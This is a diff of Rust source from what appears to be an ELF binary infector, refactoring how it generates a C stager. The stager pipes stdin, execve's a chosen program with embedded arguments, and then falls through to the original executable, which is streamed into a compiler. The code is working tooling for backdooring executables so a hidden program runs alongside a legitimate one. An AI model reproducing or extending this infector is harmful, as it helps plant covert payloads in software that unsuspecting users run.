@@ -38,6 +38,17 @@ impl TryFrom<args::InfectElfFwdStdin> for Infect {
     }
 }
 
+fn gen_args_src(args: &[String]) -> Result<String> {
+    let mut args_src = String::from("char *args[]={");
+    for arg in args {
+        args_src.push('"');
+        c::escape(arg.as_bytes(), &mut args_src)?;
+        args_src.push_str("\", ");
+    }
+    args_src.push_str("NULL};\n");
+    Ok(args_src)
+}
+
 pub async fn infect<W: AsyncWrite + Unpin>(
     config: &Infect,
     orig: &[u8],
@@ -48,19 +59,20 @@ pub async fn infect<W: AsyncWrite + Unpin>(
 
     let mut compiler = c::Compiler::spawn(&bin_path).await?;
 
-    info!("Generating source code...");
     let exec_path = config.exec_path();
+    let args = config.args(exec_path);
 
-    let mut args = String::from("char *args[]={");
-    for arg in config.args(exec_path).iter() {
-        args.push('"');
-        c::escape(arg.as_bytes(), &mut args)?;
-        args.push_str("\", ");
-    }
-    args.push_str("NULL};\n");
+    info!(
+        "Generating stager for exec={:?}, argv[0]={:?}, args={:?}",
+        exec_path,
+        args[0],
+        &args[1..],
+    );
 
     let mut exec_path_escaped = String::new();
     c::escape(exec_path.as_bytes(), &mut exec_path_escaped)?;
+
+    let args_src = gen_args_src(&args)?;
 
     compiler
         .add_lines(&[
@@ -76,7 +88,7 @@ pub async fn infect<W: AsyncWrite + Unpin>(
             "if (c) goto fwd;\n",
             "close(pipefd[1]);\n",
             "if (dup2(pipefd[0], STDIN_FILENO) == -1) return 1;\n",
-            &args,
+            &args_src,
             &format!("execve(\"{}\", args, environ);\n", exec_path_escaped),
             "exit(0);\n",
             "fwd:\n",
@@ -86,6 +98,7 @@ pub async fn infect<W: AsyncWrite + Unpin>(
         .await?;
 
     c::stream_bin(orig, &mut compiler.stdin).await?;
+
     compiler
         .add_lines(&[
             "close(pipefd[1]);\n",
